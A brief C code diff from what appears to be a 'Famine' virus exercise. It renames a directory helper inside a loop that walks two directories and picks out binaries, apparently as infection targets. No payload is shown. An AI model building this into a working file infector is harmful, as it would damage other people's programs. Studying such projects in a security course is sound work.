@@ -59,10 +59,10 @@ int main()
         return (1);
     while (i < 2)
     {
-        famine->dir = opendir(ft_setdir(i));
+        famine->dir = opendir(ft_getdir(i));
         while ((famine->readdir = readdir(famine->dir)) != NULL)
         {
-            snprintf(path, sizeof(path), "%s/%s", ft_setdir(i), famine->readdir->d_name);
+            snprintf(path, sizeof(path), "%s/%s", ft_getdir(i), famine->readdir->d_name);
             if (famine->readdir->d_name[0] == '.')
                 continue;
             famine->binary = path; 
